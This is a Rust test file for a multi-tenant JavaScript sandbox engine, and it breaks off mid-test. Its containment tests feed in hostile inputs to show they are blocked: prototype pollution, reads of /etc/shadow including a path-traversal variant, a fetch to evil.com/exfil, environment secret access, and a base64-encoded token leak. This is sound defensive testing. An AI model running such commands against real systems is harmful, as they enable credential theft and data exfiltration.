#![allow(unused_imports)]
use crate::intrinsics::{
    digest_to_hex, fast_format_bytes, fast_format_ms, fast_parse_bytes, fast_parse_ms,
    hmac_sha256_hex, sha256_hex, Sha256State,
};
use crate::{
    compile_source_to_bytecode, disassemble_bytecode, run_source_isolated, ExecutionTier,
    HttpRequestContext, JsValue, SliceIsolate,
};
use slice_sandbox::{CapabilityToken, SandboxViolation};

#[test]
fn test_tiered_execution_and_cold_start() {
    let ts_src = r#"
interface Config {
    iterations: number;
}
function fib(n: number): number {
    if (n <= 1) return n;
    return fib(n - 1) + fib(n - 2);
}
function numericLoop(iterations: number): number {
    let acc: number = 0;
    for (let i: number = 0; i < iterations; i++) {
        acc += i;
    }
    return acc;
}
const base: number = 40;
const offset: number = 2;
const sum: number = base + offset;
const f: number = fib(40);
const loop_sum: number = numericLoop(100000);
console.log(sum);
console.log(f);
"#;
    let bytecode = compile_source_to_bytecode(ts_src);
    let mut isolate = SliceIsolate::spawn(
        "bench-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bytecode, None).unwrap();
    assert_eq!(metrics.highest_tier_reached, ExecutionTier::Tier2PeakNative);
    assert_eq!(metrics.stdout[0], "42");
    assert_eq!(metrics.stdout[1], "102334155");
    assert_eq!(metrics.os_stat_syscalls, 0);
}

#[test]
fn test_repl_javascript_session_expressions() {
    let mut isolate = SliceIsolate::spawn(
        "repl-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        1024 * 1024,
    );

    // 1. `var t = 3;`
    let m1 = isolate
        .execute_bytecode(&compile_source_to_bytecode("var t = 3;"), None)
        .unwrap();
    assert_eq!(m1.return_value, "3");

    // 2. `t`
    let m2 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t"), None)
        .unwrap();
    assert_eq!(m2.return_value, "3");

    // 3. `t * 4`
    let m3 = isolate
        .execute_bytecode(&compile_source_to_bytecode("t * 4"), None)
        .unwrap();
    assert_eq!(m3.return_value, "12");

    // 4. `print(t)`
    let m4 = isolate
        .execute_bytecode(&compile_source_to_bytecode("print(t)"), None)
        .unwrap();
    assert_eq!(m4.stdout.last().unwrap(), "3");

    // 5. `console.log(t * 4);`
    let m5 = isolate
        .execute_bytecode(&compile_source_to_bytecode("console.log(t*4);"), None)
        .unwrap();
    assert_eq!(m5.stdout.last().unwrap(), "12");

    // 6. Functions, arrays, objects, higher-order methods
    let js_complex = r#"
function double(n) { return n * 2; }
const arr = [1, 2, 3, 4].map((x) => double(x));
const obj = { total: arr.reduce((a, b) => a + b, 0) };
obj.total + t
"#;
    let m6 = isolate
        .execute_bytecode(&compile_source_to_bytecode(js_complex), None)
        .unwrap();
    assert_eq!(m6.return_value, "23");
}

#[test]
fn test_sliceboa_zero_copy_and_fips_sha256_plus_fs_bridge() {
    // Test classes + node:crypto SHA-256 + node:path + node:fs roundtrip in BoaFullEsVm
    let ts_app = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";
import * as os from "node:os";
import * as fs from "node:fs";

class ReceiptSigner {
    private readonly prefix: string;
    constructor(prefix: string) {
        this.prefix = prefix;
    }
    public sign(payload: string): string {
        return crypto.createHash("sha256").update(this.prefix + ":" + payload).digest("hex");
    }
}

const signer = new ReceiptSigner("slice");
const digest = signer.sign("abc");
const tmpFile = path.join(os.tmpdir(), "slice_engine_unit_test.txt");
fs.writeFileSync(tmpFile, digest);
const readBack = fs.readFileSync(tmpFile, "utf8");
const statSize = fs.statSync(tmpFile).size;
fs.unlinkSync(tmpFile);
console.log(JSON.stringify({ match: readBack === digest, size: statSize, prefix8: digest.slice(0, 8) }));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_app, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert_eq!(&bc[0..8], crate::BOACAS_MAGIC);

    let disasm = disassemble_bytecode(&bc).unwrap();
    assert!(disasm[0].contains("BOACAS_PRECOMP") || disasm[0].contains("BOA_ES2024_VM"));

    let mut isolate = SliceIsolate::spawn(
        "boa-test-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let metrics = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"match":true,"size":64,"prefix8":"951cd52a"}"#
    );

    // Verify raw NIST FIPS-180-4 SHA-256 test vector for "abc"
    assert_eq!(
        sha256_hex(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
}

#[test]
fn test_all_five_security_containment_vectors_in_engine() {
    // 1. SES Prototype Pollution
    let mut iso1 = SliceIsolate::spawn("sec-1", 1, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso1.execute_bytecode(
            &compile_source_to_bytecode("Object.prototype.polluted = true;"),
            None
        ),
        Err(SandboxViolation::IntrinsicMutationBlocked { .. })
    ));

    // 2. Unauthorized VFS Read
    let mut iso2 = SliceIsolate::spawn(
        "sec-2",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/allowed"),
        1000,
        65536,
    );
    assert!(matches!(
        iso2.execute_bytecode(
            &compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"),
            None
        ),
        Err(SandboxViolation::FsReadDenied { .. })
    ));

    // 3. Unauthorized Outbound Network Fetch
    let mut iso3 = SliceIsolate::spawn(
        "sec-3",
        3,
        CapabilityToken::pure_compute().with_net_host("api.internal:443"),
        1000,
        65536,
    );
    assert!(matches!(
        iso3.execute_bytecode(
            &compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"),
            None
        ),
        Err(SandboxViolation::NetAccessDenied { .. })
    ));

    // 4. Unauthorized Environment Variable Access
    let mut iso4 = SliceIsolate::spawn("sec-4", 4, CapabilityToken::pure_compute(), 1000, 65536);
    assert!(matches!(
        iso4.execute_bytecode(
            &compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"),
            None
        ),
        Err(SandboxViolation::EnvAccessDenied { .. })
    ));

    // 5. Infinite Loop CPU Fuel Preemption
    let mut iso5 = SliceIsolate::spawn("sec-5", 5, CapabilityToken::pure_compute(), 250, 65536);
    assert!(matches!(
        iso5.execute_bytecode(&compile_source_to_bytecode("while (true) {}"), None),
        Err(SandboxViolation::CpuFuelExhausted { .. })
    ));
}

#[test]
fn test_warm_boa_context_pool_speedup_and_reuse() {
    SliceIsolate::prewarm_boa_pool(2);
    assert!(SliceIsolate::boa_pool_available() >= 2);

    let ts_code = r#"
import * as crypto from "node:crypto";
import * as path from "node:path";

class FastEdgeWorker {
    public compute(route: string): string {
        const normalized = path.join("/v1/edge", route, "check");
        const sig = crypto.createHash("sha256").update(normalized).digest("hex").slice(0, 12);
        return normalized + ":" + sig;
    }
}

const w = new FastEdgeWorker();
console.log(w.compute("checkout"));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);

    let mut isolate = SliceIsolate::spawn(
        "warm-pool-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m1 = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m1.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");

    // Second execution reuses the warm Boa realm returned to BOA_CONTEXT_POOL
    let mut isolate2 = SliceIsolate::spawn(
        "warm-pool-tenant-2",
        2,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m2 = isolate2.execute_bytecode(&bc, None).unwrap();
    assert_eq!(m2.stdout[0], "/v1/edge/checkout/check:6d3e872e9820");
    assert!(SliceIsolate::boa_pool_available() >= 2);
}

#[test]
fn test_phase_7_3_native_semver_and_phase_7_4_boa_ocap_enforcement() {
    let ts_code = r#"
class SemverChecker {
    public run(): string {
        const v1 = __slice_semver_valid("v2.4.8");
        const v2 = __slice_semver_valid("invalid");
        const c1 = __slice_semver_coerce("v42.6.7.9.3-alpha");
        const gt1 = __slice_semver_gt("2.1.0", "2.0.9");
        const sat1 = __slice_semver_satisfies("1.5.2", ">=1.2.0 <2.0.0");
        const sat2 = __slice_semver_satisfies("2.0.0", "^1.2.3");
        return JSON.stringify({ v1, v2, c1, gt1, sat1, sat2 });
    }
}

console.log(new SemverChecker().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_code, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "semver-tenant",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        4 * 1024 * 1024,
    );
    let m = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"v1":"2.4.8","v2":null,"c1":"42.6.7","gt1":true,"sat1":1,"sat2":0}"#
    );

    // Phase 7.4: Verify native Boa `node:fs` enforces OCap path traversal & read prefixes
    let ocap_escape_ts = r#"
import * as fs from "node:fs";
class EscapeAttempt {
    public leak(): string {
        return fs.readFileSync("/etc/../etc/shadow", "utf8");
    }
}
console.log(new EscapeAttempt().leak());
"#;
    let ocap_bundled = slice_cas::strip_typescript_and_normalize(ocap_escape_ts, true);
    let ocap_bc = compile_source_to_bytecode(&ocap_bundled);
    let mut ocap_iso = SliceIsolate::spawn(
        "ocap-boa-tenant",
        2,
        CapabilityToken::pure_compute().with_read_prefix("/app/safe"),
        10_000_000,
        4 * 1024 * 1024,
    );
    assert!(matches!(
        ocap_iso.execute_bytecode(&ocap_bc, None),
        Err(SandboxViolation::FsReadDenied { .. })
    ));
}

#[test]
fn test_phase_9a_micro_optimizations_and_streaming_sha256() {
    // 1. Verify JsValue enum size is strictly 16 bytes (4 values per 64B cache line)
    assert_eq!(std::mem::size_of::<JsValue>(), 16);

    // 2. Verify streaming Sha256State produces identical digests to one-shot sha256_bytes
    // across <64B, =64B, >64B, and >128B block boundaries without intermediate heap vecs.
    let payload = b"The quick brown fox jumps over the lazy dog - Slice Phase 9A zero-allocation streaming SHA-256 verification across multiple 64-byte FIPS-180-4 blocks!";
    let expected_hex = sha256_hex(payload);

    let mut streamer = Sha256State::new();
    for chunk in payload.chunks(13) {
        streamer.update(chunk);
    }
    assert_eq!(digest_to_hex(&streamer.finalize()), expected_hex);

    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    if std::arch::is_x86_feature_detected!("sha")
        && std::arch::is_x86_feature_detected!("sse4.1")
        && std::arch::is_x86_feature_detected!("ssse3")
    {
        let mut s_soft = Sha256State::new();
        let mut s_hw = Sha256State::new();
        let block: &[u8; 64] = payload[..64].try_into().unwrap();
        Sha256State::compress_block_soft(&mut s_soft.h, block);
        unsafe {
            Sha256State::compress_block_sha_ni(&mut s_hw.h, block);
        }
        assert_eq!(s_soft.h, s_hw.h);
    }

    // 3. Verify HMAC-SHA256 with both short key (<=64B) and long key (>64B)
    let hmac_short = hmac_sha256_hex(b"secret-key", payload);
    assert_eq!(hmac_short.len(), 64);
    let hmac_long = hmac_sha256_hex(&[b'k'; 100], payload);
    assert_eq!(hmac_long.len(), 64);
    assert_ne!(hmac_short, hmac_long);

    // 4. Verify SLICEBC\x01 (or SLICEBOA) bytecode is pre-wrapped with block braces at compile time
    let ts_class = "class A { run(): number { return 7; } }\nconsole.log(new A().run());";
    let bundled = slice_cas::strip_typescript_and_normalize(ts_class, true);
    let bc = compile_source_to_bytecode(&bundled);
    assert_eq!(&bc[0..8], crate::BOACAS_MAGIC);
    let (_, _, fb_js) = crate::BoaCasHeader::decode(&bc).unwrap();
    assert!(fb_js.starts_with("{\n"));
    assert!(fb_js.ends_with("\n}"));

    // 5. Verify native fast_parse_ms, fast_format_ms, fast_parse_bytes, and fast_format_bytes
    assert_eq!(fast_parse_ms("2h"), Some(7_200_000.0));
    assert_eq!(fast_parse_ms("30s"), Some(30_000.0));
    assert_eq!(fast_parse_ms("15m"), Some(900_000.0));
    assert_eq!(
        fast_format_ms(120_000.0, true).as_deref(),
        Some("2 minutes")
    );
    assert_eq!(fast_format_ms(120_000.0, false).as_deref(), Some("2m"));
    assert_eq!(fast_parse_bytes("64KB"), Some(65_536.0));
    assert_eq!(fast_parse_bytes("128KB"), Some(131_072.0));
    assert_eq!(fast_format_bytes(65_536.0).as_deref(), Some("64KB"));
    assert_eq!(fast_format_bytes(4_730_880.0).as_deref(), Some("4.51MB"));

    // 6. Verify Persistent Realm Module Cache (__slice_rc) & prewarm_boa_bundle
    let rc_bundle = "var __slice_modules = {};//__SLICE_RC:0123456789abcdef\nvar __rc = globalThis.__slice_rc || (globalThis.__slice_rc = Object.create(null));\nvar __run = __rc[\"0123456789abcdef\"] || (__rc[\"0123456789abcdef\"] = function() { console.log(\"rc-ok\"); });\n__run();";
    let rc_bc = compile_source_to_bytecode(rc_bundle);
    SliceIsolate::prewarm_boa_bundle(&rc_bc);
    let mut rc_iso = SliceIsolate::spawn(
        "rc-tenant",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let rc_m = rc_iso.execute_bytecode(&rc_bc, None).unwrap();
    assert_eq!(rc_m.stdout, vec!["rc-ok"]);

    // 7. Verify Phase 9B Priority 3: Oxc Semantic Hints & Monomorphic Tier-2 Loop Promotion
    let ts_typed_loop = r#"
        export interface MetricPoint {
            readonly seq: number;
            readonly service: string;
            readonly latencyMs: number;
        }
        let acc: number = 0;
        for (let i: number = 0; i < 2000; i++) {
            acc += i * 3;
        }
        return acc;
    "#;
    let hints = slice_cas::analyze_typescript_semantics(ts_typed_loop);
    assert!(hints.numeric_vars.contains("acc"));
    assert!(hints.numeric_vars.contains("i"));
    assert!(hints.interface_schemas.contains_key("MetricPoint"));
    assert!(hints.semantic_symbol_count >= 2);

    let loop_bc = compile_source_to_bytecode(ts_typed_loop);
    let mut loop_iso = SliceIsolate::spawn(
        "tier2-mono-loop",
        1,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let loop_metrics = loop_iso.execute_bytecode(&loop_bc, None).unwrap();
    assert_eq!(
        loop_metrics.highest_tier_reached,
        ExecutionTier::Tier2PeakNative
    );
    // sum_{i=0..1999} 3*i = 3 * (1999 * 2000 / 2) = 5,997,000
    assert_eq!(loop_metrics.return_value, "5997000");
}

#[test]
fn test_tag_n1_wintertc_http_bridge_and_wait_until() {
    // Test 1: Tier-1 SLICEBOA handler using Slice.request(), Slice.respond(), and Slice.waitUntil()
    let handler_ts = r#"
class EdgeRouter {
    public handle(): void {
        const req = Slice.request();
        const auth = req.header("authorization");
        Slice.waitUntil(() => {
            globalThis.__audit_trail = req.method + ":" + req.path + ":" + req.tenant;
        });
        Slice.respond(
            201,
            JSON.stringify({
                method: req.method,
                path: req.path,
                query: req.query,
                tenant: req.tenant,
                auth: auth,
                bodyLen: req.body.length
            }),
            "application/json"
        );
    }
}
new EdgeRouter().handle();
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(handler_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    SliceIsolate::prewarm_boa_bundle(&bc);

    let mut isolate = SliceIsolate::spawn(
        "n1-edge-tenant",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );

    let headers = [
        ("Authorization", "Bearer tok_xyz"),
        ("Host", "edge.slice.dev"),
    ];
    let req_ctx = HttpRequestContext {
        method: "POST",
        path: "/v1/orders",
        query: "region=us-east",
        tenant_id: "n1-edge-tenant",
        headers: &headers,
        body: r#"{"item":"gpu-node"}"#,
    };

    let outcome = isolate.execute_http_request(&bc, None, &req_ctx).unwrap();
    assert_eq!(outcome.status_code, 201);
    assert_eq!(outcome.content_type, "application/json");
    assert_eq!(outcome.wait_until_count, 1);
    assert_eq!(
        outcome.response_body,
        r#"{"method":"POST","path":"/v1/orders","query":"region=us-east","tenant":"n1-edge-tenant","auth":"Bearer tok_xyz","bodyLen":19}"#
    );

    // Drain deferred Slice.waitUntil() callbacks after HTTP response is prepared
    let ran = isolate.drain_wait_until_tasks().unwrap();
    assert_eq!(ran, 1);

    // Test 2: Tier-0 SLICESNP cached fast-path execution via execute_http_request
    let fast_ts = "const x: number = 21 * 2;\nreturn x;\n";
    let fast_bc = compile_source_to_bytecode(fast_ts);
    let mut fast_iso = SliceIsolate::spawn(
        "n1-fast-tenant",
        2,
        CapabilityToken::pure_compute(),
        100_000,
        65536,
    );
    let fast_outcome = fast_iso
        .execute_http_request(&fast_bc, None, &req_ctx)
        .unwrap();
    assert_eq!(fast_outcome.status_code, 200);
    assert_eq!(fast_outcome.wait_until_count, 0);
    assert_eq!(fast_outcome.response_body, "42");
}

#[test]
fn test_tag_n2_sharded_edge_kv_isolation_and_deterministic_replay() {
    // 1. Test Slice.kv multi-tenant isolation, atomic counters, and memory quota enforcement
    let kv_ts = r#"
class KvService {
    public run(): string {
        const c1 = Slice.kv.incr("hits", 1);
        const c2 = Slice.kv.incr("hits", 4);
        Slice.kv.set("session:abc", "active-user", 60000);
        const val = Slice.kv.get("session:abc");
        const missing = Slice.kv.get("other-key");
        return JSON.stringify({ c1, c2, val, missing });
    }
}
console.log(new KvService().run());
"#;
    let bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(kv_ts, true));

    let mut iso_a = SliceIsolate::spawn(
        "n2-tenant-alpha",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_a.kv_del("hits");
    let _ = iso_a.kv_del("session:abc");
    let m_a = iso_a.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_a.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Tenant Beta has a completely isolated KV namespace and cannot see Tenant Alpha's keys
    let mut iso_b = SliceIsolate::spawn(
        "n2-tenant-beta",
        2,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso_b.kv_del("hits");
    assert_eq!(iso_b.kv_get("session:abc"), None);
    let m_b = iso_b.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m_b.stdout[0],
        r#"{"c1":1,"c2":5,"val":"active-user","missing":null}"#
    );

    // Verify KV writes are charged against the tenant's compartment memory limit
    let kv_overflow_ts = r#"
Slice.kv.set("huge", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", 0);
"#;
    let overflow_bc = compile_source_to_bytecode(kv_overflow_ts);
    let mut tiny_iso = SliceIsolate::spawn(
        "n2-tiny-mem",
        3,
        CapabilityToken::pure_compute(),
        1_000_000,
        16, // 16-byte limit
    );
    assert!(matches!(
        tiny_iso.execute_bytecode(&overflow_bc, None),
        Err(SandboxViolation::MemoryCeilingExceeded { .. })
    ));

    // 2. Test Opt-In Deterministic Replay Mode (--deterministic=<seed>)
    let det_ts = r#"
const r1 = Math.random().toFixed(12);
const r2 = Math.random().toFixed(12);
const t1 = Date.now();
const t2 = Date.now();
const p1 = performance.now();
console.log(JSON.stringify({ r1, r2, t1, t2, p1 }));
"#;
    let det_bc = compile_source_to_bytecode(det_ts);

    let mut det_iso1 = SliceIsolate::spawn(
        "n2-det-1",
        4,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso1.set_deterministic_seed(Some(20261019));
    let out1 = det_iso1.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    let mut det_iso2 = SliceIsolate::spawn(
        "n2-det-2",
        5,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    det_iso2.set_deterministic_seed(Some(20261019));
    let out2 = det_iso2.execute_bytecode(&det_bc, None).unwrap().stdout[0].clone();

    assert_eq!(out1, out2);
    assert!(out1.contains(r#""t1":1700000000001"#));
    assert!(out1.contains(r#""t2":1700000000002"#));
}

#[test]
fn test_tag_n3_eval_sandbox_checkpoint_restore_and_egress_guard() {
    SliceIsolate::prewarm_boa_pool(2);

    // 1. Test Tree-of-Thought AI Agent workflow:
    //    - Set baseline VFS file and KV key
    //    - Call `Slice.checkpoint()`
    //    - Execute candidate Branch A in `Slice.evalSandbox(...)` which mutates KV + VFS and fails
    //    - Call `Slice.restore(snapId)` to roll back VFS + KV in < 5us
    //    - Execute candidate Branch B in `Slice.evalSandbox(...)` which succeeds
    let agent_tot_ts = r#"
import fs from "node:fs";

class TreeOfThoughtAgent {
    public run(): string {
        fs.writeFileSync("/workspace/app.ts", "export const v = 1;");
        Slice.kv.set("status", "baseline", 0);

        const snap = Slice.checkpoint();

        // Candidate Branch A: mutates VFS & KV, then attempts prototype pollution inside sub-sandbox
        fs.writeFileSync("/workspace/app.ts", "CORRUPTED_BY_BRANCH_A");
        Slice.kv.set("status", "corrupted", 0);
        const branchA = Slice.evalSandbox("Object.prototype.polluted = true;", { fuel: 50000 });
        if (!branchA.ok) {
            // Instant rollback of VFS + KV to pre-Branch-A checkpoint!
            const restored = Slice.restore(snap);
            if (!restored) {
                throw new Error("Restore failed");
            }
        }

        // Verify VFS and KV were rolled back cleanly
        const vfsAfterRollback = fs.readFileSync("/workspace/app.ts", "utf8");
        const kvAfterRollback = Slice.kv.get("status");

        // Candidate Branch B: valid TypeScript inside sub-sandbox with capability attenuation
        const branchB = Slice.evalSandbox(
            "const patchVersion: number = 2; console.log('branch-b-ok'); patchVersion * 21",
            { fuel: 200000, allowRead: ["/workspace"] }
        );

        // Candidate Branch C: attempts to escalate read capability to /etc/shadow (blocked by intersection with parent!)
        const branchC = Slice.evalSandbox(
            "const s = fs.readFileSync('/etc/shadow');",
            { fuel: 50000, allowRead: ["/etc"] }
        );

        return JSON.stringify({
            vfs: vfsAfterRollback,
            kv: kvAfterRollback,
            aOk: branchA.ok,
            bOk: branchB.ok,
            bVal: branchB.returnValue,
            bOut: branchB.stdout[0],
            cOk: branchC.ok
        });
    }
}
console.log(new TreeOfThoughtAgent().run());
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(agent_tot_ts, true);
    let bc = compile_source_to_bytecode(&bundled);
    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/workspace")
        .with_write_prefix("/workspace");
    let mut agent_iso = SliceIsolate::spawn("n3-tot-agent", 10, caps, 5_000_000, 8 * 1024 * 1024);
    let metrics = agent_iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"vfs":"export const v = 1;","kv":"baseline","aOk":false,"bOk":true,"bVal":"42","bOut":"branch-b-ok","cOk":false}"#
    );

    // 2. Test Egress Secret Guard blocking both raw and base64-encoded secret exfiltration
    let raw_leak_bc = compile_source_to_bytecode(r#"console.log("token=sk_live_99887766");"#);
    let mut leak_iso1 = SliceIsolate::spawn(
        "n3-leak-raw",
        11,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso1.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso1.execute_bytecode(&raw_leak_bc, None),
        Err(SandboxViolation::EgressSecretLeakBlocked { .. })
    ));

    // Base64 of "sk_live_99887766" is "c2tfbGl2ZV85OTg4Nzc2Ng=="
    let b64_leak_bc =
        compile_source_to_bytecode(r#"console.log("exfil=c2tfbGl2ZV85OTg4Nzc2Ng==");"#);
    let mut leak_iso2 = SliceIsolate::spawn(
        "n3-leak-b64",
        12,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    leak_iso2.add_egress_audit_secret("sk_live_99887766");
    assert!(matches!(
        leak_iso2.execute_bytecode(&b64_leak_bc, None),
        Err(SandboxViolation::EgressSecretLeakBlocked { .. })
    ));
}

#[test]
fn test_issue_1_fractional_literals_tier0_and_oxc_codegen() {
    let src = r#"
console.log("String(0.5)=" + String(0.5));
console.log("0.5*2=" + (0.5 * 2));
console.log("arr=" + JSON.stringify([0.25, 1.25]));
function f() {
    const a = 0.25;
    const b = 0.75;
    console.log("in fn:", String(a), String(a + b));
}
f();
"#;
    let bc = compile_source_to_bytecode(src);
    let mut iso = SliceIsolate::spawn(
        "issue-1-frac",
        101,
        CapabilityToken::pure_compute(),
        500_000,
        2 * 1024 * 1024,
    );
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout,
        vec![
            "String(0.5)=0.5",
            "0.5*2=1",
            "arr=[0.25,1.25]",
            "in fn: 0.25 1",
        ]
    );
}

#[test]
fn test_issue_2_eval_sandbox_tenant_id_cannot_escape_parent_kv_partition() {
    let src = r#"
Slice.kv.set("db_password", "parent-only-secret");
const own = Slice.evalSandbox('String(Slice.kv.get("db_password"))');
const escaped = Slice.evalSandbox('String(Slice.kv.get("db_password"))', { tenantId: "issue-2-parent" });
console.log(JSON.stringify({ own: own.returnValue, escaped: escaped.returnValue }));
"#;
    let bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(src, true));
    let mut iso = SliceIsolate::spawn(
        "issue-2-parent",
        102,
        CapabilityToken::pure_compute(),
        1_000_000,
        4 * 1024 * 1024,
    );
    let _ = iso.kv_del("db_password");
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(metrics.stdout[0], r#"{"own":"null","escaped":"null"}"#);
}

#[test]
fn test_issue_3_checkpoint_slab_bounded_and_released() {
    use crate::state_and_kv::{checkpoint_slab_len, MAX_CHECKPOINTS_PER_SLAB};

    let src = r#"
for (let i = 0; i < 200; i++) {
    Slice.checkpoint();
}
const last = Slice.checkpoint();
const released = Slice.releaseCheckpoint(last);
const restoredAfterRelease = Slice.restore(last);
console.log(JSON.stringify({ released, restoredAfterRelease }));
"#;
    let bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(src, true));
    let mut iso = SliceIsolate::spawn(
        "issue-3-tenant",
        103,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        metrics.stdout[0],
        r#"{"released":true,"restoredAfterRelease":false}"#
    );
    assert!(checkpoint_slab_len() <= MAX_CHECKPOINTS_PER_SLAB);

    // Cross-tenant restore or release must fail
    let snap_a = iso.checkpoint();
    let iso_b = SliceIsolate::spawn(
        "issue-3-other-tenant",
        104,
        CapabilityToken::pure_compute(),
        100_000,
        1024 * 1024,
    );
    assert!(!iso_b.restore(snap_a));
    assert!(!iso_b.release_checkpoint(snap_a));

    // Resetting isolate for a new request clears all checkpoints owned by that tenant
    iso.reset_for_request("issue-3-tenant-next", 103, 1_000_000, 1024 * 1024);
    assert!(!iso.restore(snap_a));
}

#[test]
fn test_issue_4_guest_stdout_preserved_when_sandbox_traps() {
    use crate::SandboxEvalOptions;

    let mut iso = SliceIsolate::spawn(
        "issue-4-parent",
        105,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let outcome = iso.eval_sandbox(
        r#"console.log("step 1 done"); console.log("step 2 done"); while (true) {}"#,
        SandboxEvalOptions {
            fuel: Some(200_000),
            ..Default::default()
        },
    );
    assert!(!outcome.ok);
    assert!(outcome.violation.is_some());
    assert_eq!(outcome.stdout, vec!["step 1 done", "step 2 done"]);
}

#[test]
fn test_issue_5_fuel_used_clamped_to_limit_on_fuel_trap() {
    use crate::SandboxEvalOptions;

    let mut iso = SliceIsolate::spawn(
        "issue-5-parent",
        106,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let outcome = iso.eval_sandbox(
        "while (true) {}",
        SandboxEvalOptions {
            fuel: Some(200_000),
            ..Default::default()
        },
    );
    assert!(!outcome.ok);
    assert_eq!(outcome.fuel_used, 200_000);

    // Also verify non-empty loop on the Boa path reports exact fuel limit on trap
    let outcome_boa = iso.eval_sandbox(
        "let x = 0; while (true) { x++; }",
        SandboxEvalOptions {
            fuel: Some(150_000),
            ..Default::default()
        },
    );
    assert!(!outcome_boa.ok);
    assert_eq!(outcome_boa.fuel_used, 150_000);
}

#[test]
fn test_issue_12_checkpoint_and_restore_metrics_exposed() {
    use crate::SandboxEvalOptions;

    let mut iso = SliceIsolate::spawn(
        "issue-12-parent",
        112,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let outcome = iso.eval_sandbox(
        r#"
        Slice.kv.set("k", "v1", 0);
        const s1 = Slice.checkpoint();
        Slice.kv.set("k", "v2", 0);
        const s2 = Slice.checkpoint();
        Slice.restore(s1);
        Slice.kv.get("k")
        "#,
        SandboxEvalOptions::default(),
    );
    assert!(outcome.ok);
    assert_eq!(outcome.return_value, "v1");
    assert_eq!(outcome.checkpoints_taken, 2);
    assert_eq!(outcome.restores_performed, 1);
    assert!(outcome.restore_time_ns >= 1);

    // Parent isolate also accumulates checkpoint telemetry across execute_bytecode
    assert_eq!(iso.checkpoints_taken, 2);
    assert_eq!(iso.restores_performed, 1);
    assert!(iso.restore_time_ns >= 1);
}

#[test]
fn test_issue_13_disable_checkpoints_and_max_checkpoints_attenuation() {
    use crate::SandboxEvalOptions;

    // 1. Disabling checkpoints via SandboxEvalOptions traps when guest calls Slice.checkpoint()
    let mut iso = SliceIsolate::spawn(
        "issue-13-parent",
        113,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let denied = iso.eval_sandbox(
        "const snap = Slice.checkpoint(); snap",
        SandboxEvalOptions {
            checkpoints: Some(false),
            ..Default::default()
        },
    );
    assert!(!denied.ok);
    let viol = denied.violation.unwrap_or_default();
    assert!(
        viol.contains("CapabilityDenied: checkpoints") || viol.contains("checkpoint denied"),
        "Expected CheckpointDenied violation, got: {}",
        viol
    );

    // 2. max_checkpoints enforcement: 2 allowed, 3rd traps even inside try/catch
    let max_exceeded = iso.eval_sandbox(
        r#"
        const s1 = Slice.checkpoint();
        const s2 = Slice.checkpoint();
        try { Slice.checkpoint(); } catch (_) {}
        s2
